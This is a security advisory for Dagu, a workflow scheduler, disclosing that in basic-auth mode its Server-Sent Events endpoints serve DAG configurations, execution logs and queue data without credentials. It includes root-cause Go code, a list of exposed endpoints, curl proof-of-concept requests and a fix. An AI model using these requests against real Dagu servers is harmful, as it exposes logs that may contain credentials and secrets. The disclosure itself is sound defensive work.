# [H] Dagu: SSE Authentication Bypass in Basic Auth Mode

## Summary
Severity: High
Advisory: GHSA-9wmw-9wph-2vwp
CVE: CVE-2026-31882
CWE: CWE-306
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-9wmw-9wph-2vwp
Type: github-advisory

## Affected
- npm: `dagu` — affected >=0 <2.2.4

## Details
# SSE Authentication Bypass in Basic Auth Mode

## Summary

When Dagu is configured with HTTP Basic authentication (`DAGU_AUTH_MODE=basic`), all Server-Sent Events (SSE) endpoints are accessible without any credentials. This allows unauthenticated attackers to access real-time DAG execution data, workflow configurations, execution logs, and queue status — bypassing the authentication that protects the REST API.

## Severity

**HIGH** (CVSS 3.1: 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

## Affected Versions

- dagu v2.2.3 (latest) and likely all versions with basic auth support

## Affected Component

`internal/service/frontend/server.go` — `buildStreamAuthOptions()` function (lines 1177–1201)

## Root Cause

The `buildStreamAuthOptions()` function builds authentication options for SSE/streaming endpoints. When the auth mode is `basic`, it returns an `auth.Options` struct with `BasicAuthEnabled: true` but `AuthRequired` defaults to `false` (Go zero value):

```go
// server.go:1195-1201
if authCfg.Mode == config.AuthModeBasic {
    return auth.Options{
        Realm:            realm,
        BasicAuthEnabled: true,
        Creds:            map[string]string{authCfg.Basic.Username: authCfg.Basic.Password},
        // AuthRequired is NOT set — defaults to false
    }
}
```

The authentication middleware at `internal/service/frontend/auth/middleware.go:181-183` allows unauthenticated requests when `AuthRequired` is false:

```go
// No credentials provided
// If auth is not required, allow the request through
if !opts.AuthRequired {
    next.ServeHTTP(w, r)
    return
}
```

The developers left a FIXME comment (line 1193) acknowledging this issue:
```
// FIXME: add a session-token mechanism for basic-auth users so browser
// EventSource requests can authenticate via the ?token= query parameter.
```

## Exposed SSE Endpoints

All SSE routes are affected (`server.go:1004-1019`):

| Endpoint | Data Leaked |
|----------|-------------|
| `/api/v1/events/dags` | All DAG names, descriptions, file paths, schedules, tags, execution status |
| `/api/v1/events/dags/{fileName}` | Individual DAG configuration details |
| `/api/v1/events/dags/{fileName}/dag-runs` | DAG execution history |
| `/api/v1/events/dag-runs` | All active DAG runs across the system |
| `/api/v1/events/dag-runs/{name}/{dagRunId}` | Specific DAG run status and node details |
| `/api/v1/events/dag-runs/{name}/{dagRunId}/logs` | Execution logs (may contain secrets, credentials, API keys) |
| `/api/v1/events/dag-runs/{name}/{dagRunId}/logs/steps/{stepName}` | Step-level stdout/stderr logs |
| `/api/v1/events/queues` | Queue status and pending work items |
| `/api/v1/events/queues/{name}/items` | Queue item details |
| `/api/v1/events/docs-tree` | Documentation tree |
| `/api/v1/events/docs/*` | Documentation content |

Additionally, the Agent SSE stream uses the same auth options (`server.go:1166`).

## Proof of Concept

### Setup
```bash
# Start Dagu with basic auth
export DAGU_AUTH_MODE=basic
export DAGU_AUTH_BASIC_USERNAME=admin
export DAGU_AUTH_BASIC_PASSWORD=secret123
dagu start-all
```

### Verify REST API requires auth
```bash
# Regular API — returns 401 Unauthorized
curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/api/v1/dags
# Output: 401

# With credentials — returns 200
curl -s -o /dev/null -w "%{http_code}" -u admin:secret123 http://localhost:8080/api/v1/dags
# Output: 200
```

### Exploit SSE bypass
```bash
# SSE endpoint WITHOUT any credentials — returns 200 with full data
curl -s -N http://localhost:8080/api/v1/events/dags
```

**Output (truncated):**
```
event: connected
data: {"topic":"dagslist:"}

event: data
data: {"dags":[{"dag":{"name":"example-01-basic-sequential","schedule":[],...},
"filePath":"/home/user/.config/dagu/dags/example-01-basic-sequential.yaml",
"latestDAGRun":{"dagRunId":"...","status":4,"statusLabel":"succeeded",...}},
...]}
```

```bash
# Access execution logs without credentials
curl -s -N http://localhost:8080/api/v1/events/dag-runs/{dagName}/{runId}/logs
```

**Output:**
```
event: data
data: {"schedulerLog":{"content":"...step execution details, parameters, outputs..."},"stepLogs":[...]}
```

### Wrong credentials are rejected
```bash
# Invalid credentials — returns 401 (auth validates IF provided, but doesn't REQUIRE it)
curl -s -o /dev/null -w "%{http_code}" -u wrong:wrong http://localhost:8080/api/v1/events/dags
# Output: 401
```

## Impact

An unauthenticated network attacker can:

1. **Enumerate all workflows**: DAG names, descriptions, file paths, schedules, and tags
2. **Monitor execution in real-time**: Track which workflows are running, their status, and when they complete
3. **Read execution logs**: Access stdout/stderr of workflow steps, which commonly contain sensitive data (API keys, database credentials, tokens, internal hostnames)
4. **Map infrastructure**: File paths and workflow configurations reveal server directory structure and deployment details
5. **Observe queue state**: Understand pending work items and system load

This is especially critical in environments where:
- Workflows process sensitive data (credentials, PII, financial data)
- DAG parameters contain secrets passed at runtime
- Log output includes API responses or database queries with sensitive content

## Suggested Fix

Set `AuthRequired: true` for basic auth mode and implement the session-token mechanism referenced in the FIXME comment:

```go
if authCfg.Mode == config.AuthModeBasic {
    return auth.Options{
        Realm:            realm,
        BasicAuthEnabled: true,
        AuthRequired:     true,  // Require authentication
        Creds:            map[string]string{authCfg.Basic.Username: authCfg.Basic.Password},
    }
}
```

For browser SSE compatibility, implement a session token that can be passed via the `?token=` query parameter (the `QueryTokenMiddleware` already exists at `auth/middleware.go:39` to convert query params to Bearer tokens).

## References
- https://github.com/dagu-org/dagu/security/advisories/GHSA-9wmw-9wph-2vwp
- https://nvd.nist.gov/vuln/detail/CVE-2026-31882
- https://github.com/dagu-org/dagu/pull/1752
- https://github.com/dagu-org/dagu/commit/064616c9b80c04824c1c7c357308f77f3f24d775
- https://github.com/dagu-org/dagu
- https://github.com/dagu-org/dagu/releases/tag/v2.2.4
